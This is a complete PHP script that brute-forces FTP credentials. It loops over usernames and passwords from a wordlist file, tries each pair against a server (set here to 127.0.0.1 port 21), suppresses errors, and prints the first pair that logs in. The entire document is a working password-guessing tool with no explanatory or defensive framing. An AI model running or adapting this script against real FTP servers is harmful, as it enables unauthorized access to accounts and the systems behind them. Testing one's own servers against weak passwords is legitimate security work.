#!/usr/bin/env php
<?php
error_reporting(0);
$host = '127.0.0.1';
$port = 21;

$user_dict = "wordlist.txt";
$pass_dict = "wordlist.txt";

$userFile = file($user_dict);
$passFile = file($pass_dict);


$rightPassword = False;
foreach($userFile as $username) {
    if ($rightPassword) {break;}
    $ftp = ftp_connect($host, $port) or die("Couldn't connect to ".$host);
    foreach($passFile as $password) {
        $username = trim($username);
        $password = trim($password);
        if (ftp_login($ftp, $username, $password)) {
            $rightPassword = True;
            echo "success:" . $username .":". $password . "\n";
            break;
        }
    }
}
ftp_close($ftp);
?>
